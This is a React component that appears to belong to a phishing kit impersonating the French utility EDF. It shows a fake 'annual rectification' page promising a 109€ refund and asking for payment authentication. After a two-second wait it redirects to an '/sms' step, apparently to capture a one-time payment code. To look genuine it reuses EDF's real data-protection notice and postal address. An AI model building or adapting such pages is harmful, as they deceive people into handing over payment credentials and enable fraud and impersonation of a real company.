import react from 'react';
import './css/final.css';
import { BrowserRouter as Router, Route, useHistory } from "react-router-dom";
function Loadigz() {
  var history = useHistory();
  setTimeout(() => {  history.push("/sms"); }, 2000);
  
  return (
    <div className="Loadigz">
     <div>
        <div id="title">
          <img style={{marginTop: '10px'}} src="logo.png" />
          <h1 style={{fontSize: '30px', color: 'rgb(226, 58, 5)', float: 'right', marginRight: '10px'}}> Rectification annuelle EDF </h1>
        </div>
        <div id="corps1">
          <div id="title2">
            <h2 style={{color: 'rgb(50, 50, 50)', paddingLeft: '20px', fontSize: '20px'}}>Remboursement - Total : 109€ </h2>
          </div>
          <br />
          <div id="prefooterAmeli_1" className="wlp-bighorn-window  "><div className="wlp-bighorn-window-content">
              <div className="prefooterbody seul" style={{fontSize: '14px', padding: '0px 0px 1px 0px', fontWeight: 'bolder'}}>
                <p>   Authentification de paiement</p>
              </div></div></div>
          <br />
          <div align="center" style={{padding: '8px', margin: 'auto', border: '1px solid #CCC', backgroundColor: '#f5f5f5', textAlign: 'center'}}>
            <br />
            <div align="center" style={{padding: '8px', margin: 'auto', border: '1px solid #CCC', backgroundColor: '#f5f5f5', textAlign: 'center'}}>
              <form action method="post" id="formulaire_saisie_adresse">
                <div style={{fontWeight: 'bolder', fontSize: '12px'}}>Veuillez patienter pendant que nous
                  traitons votre demande<br />Ne pas fermer cette fenêtre<br /><img src="https://media.giphy.com/media/xTk9ZvMnbIiIew7IpW/giphy.gif" style={{width: '3%'}} /></div>
              </form>
            </div>
          </div>
        </div>
    
        <div className="container">
          &nbsp;
          <p style={{marginTop: '-40px'}}> Votre adresse e-mail sera exclusivement utilisée dans le cadre de votre espace Client. Elle ne sera jamais vendue à un tiers. 
            Les informations collectées sont destinées à EDF. Elles seront utilisées dans le cadre de la création de votre espace Client et le cas échéant à des fins de prospection commerciale. Conformément à la loi informatique et libertés modifiée, vous disposez sur les informations vous concernant d’un droit d’accès et de rectification ainsi que d’un droit d’opposition, sans frais, à l’utilisation de ces informations à des fins de prospection commerciale.
            Vous pouvez exercer vos droits sous réserve de justifier de votre identité en vous adressant par courrier à EDF - Direction de la Communication - Département Multimédia, 22 - 30 Avenue de Wagram - 75008 Paris. </p>
          <table align="center" width={750}>
            <tbody>
              <tr>
                <td>
                  <img src="sec.png" /> 
                </td>
              </tr>
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}

export default Loadigz;